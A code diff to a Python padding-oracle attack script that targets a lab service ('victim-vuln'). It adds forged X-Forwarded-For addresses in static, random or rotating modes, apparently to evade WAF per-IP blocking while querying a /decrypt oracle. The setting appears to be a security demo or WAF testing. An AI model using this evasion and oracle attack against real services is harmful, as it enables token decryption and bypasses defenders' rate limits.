@@ -22,6 +22,16 @@ def get_local_ip() -> str:
 
 
 LOCAL_IP = get_local_ip()
+GLOBAL_IP_MODE = "static"
+GLOBAL_RAND_IP = f"198.51.100.{random.randint(2, 250)}"
+
+
+def get_attack_ip() -> str:
+    if GLOBAL_IP_MODE == "rotate":
+        return f"203.0.113.{random.randint(2, 250)}"
+    if GLOBAL_IP_MODE == "random":
+        return GLOBAL_RAND_IP
+    return LOCAL_IP
 
 
 class WafBlockedException(Exception):
@@ -33,18 +43,20 @@ def parse_args() -> argparse.Namespace:
     p = argparse.ArgumentParser()
     p.add_argument("--target", default="http://victim-vuln:8080")
     p.add_argument("--mode", choices=["vuln", "timing"], default="vuln")
-    p.add_argument("--sleep-ms", type=float, default=0.0)
+    p.add_argument("--sleep-ms", type=float, default=4.0)
     p.add_argument("--scenario-id", default="attack-demo")
+    p.add_argument("--ip-mode", choices=["static", "random", "rotate"], default="static")
     return p.parse_args()
 
 
 def decrypt_oracle_status(base_url: str, token: bytes) -> tuple[int, float]:
     started = time.perf_counter()
+    cur_ip = get_attack_ip()
     try:
         r = requests.post(
             f"{base_url}/decrypt",
             json={"token": b64e(token)},
-            headers={"X-Client-Role": "attacker", "X-Client-ID": "attacker", "X-Forwarded-For": LOCAL_IP},
+            headers={"X-Client-Role": "attacker", "X-Client-ID": "attacker", "X-Forwarded-For": cur_ip},
             timeout=5,
         )
         latency = (time.perf_counter() - started) * 1000
@@ -273,10 +285,12 @@ def padding_oracle_attack_first_block(
 
 def main() -> int:
     args = parse_args()
+    global GLOBAL_IP_MODE
+    GLOBAL_IP_MODE = args.ip_mode
     try:
         token_b64 = requests.get(
             f"{args.target}/sample_token",
-            headers={"X-Client-Role": "attacker", "X-Client-ID": "attacker"},
+            headers={"X-Client-Role": "attacker", "X-Client-ID": "attacker", "X-Forwarded-For": get_attack_ip()},
             timeout=5,
         ).json()["token"]
     except Exception as e:
